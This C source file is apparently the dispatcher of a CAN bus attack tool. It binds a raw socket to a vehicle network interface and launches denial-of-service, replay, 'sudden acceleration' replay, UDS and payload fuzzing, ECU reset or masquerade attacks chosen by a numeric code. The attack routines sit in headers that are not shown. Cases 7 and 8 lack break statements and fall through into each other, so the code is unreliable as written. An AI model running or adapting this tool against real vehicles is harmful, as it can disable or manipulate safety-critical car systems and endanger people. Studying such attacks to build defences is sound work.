#include "payloads.h"
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "attack_sender.h"

void attack_packet_sender(const char *interface, int attack_code, int canid, int time_diff) {
    int s;
    struct sockaddr_can addr;
    struct ifreq ifr;

    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
        perror("Socket creation error");
        exit(1);
    }

    //set interface name
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX error");
        close(s);
        exit(1);
    }

    //set socket address
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;

    //socket binding
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Socket binding error");
        close(s);
        exit(1);
    }

    //call attack-functions
    // dos, replay, fuzzing, suspension, msq
    switch (attack_code) {
        case 1:
            dos_dos(s, &addr, canid);
            break;
        case 2:
            replay_replay(s, &addr, canid);
            break;
        case 3:
            replay_suddenaccel(s, &addr, canid);
            break;
        case 4:
            fuzzing_find_uds(s, &addr, canid);
            break;
        case 5:
            fuzing_random_canid(s, &addr, canid);
            break;
        case 6:
            fuzzing_random_payload(s, &addr, canid);
            break;
        case 7:
            suspension_resetecu(s, &addr, canid);
        case 8:
            msq_msq(s, &addr, canid);

        default:
            printf("Invalid attack code\n");
            break;
    }

    close(s);
}

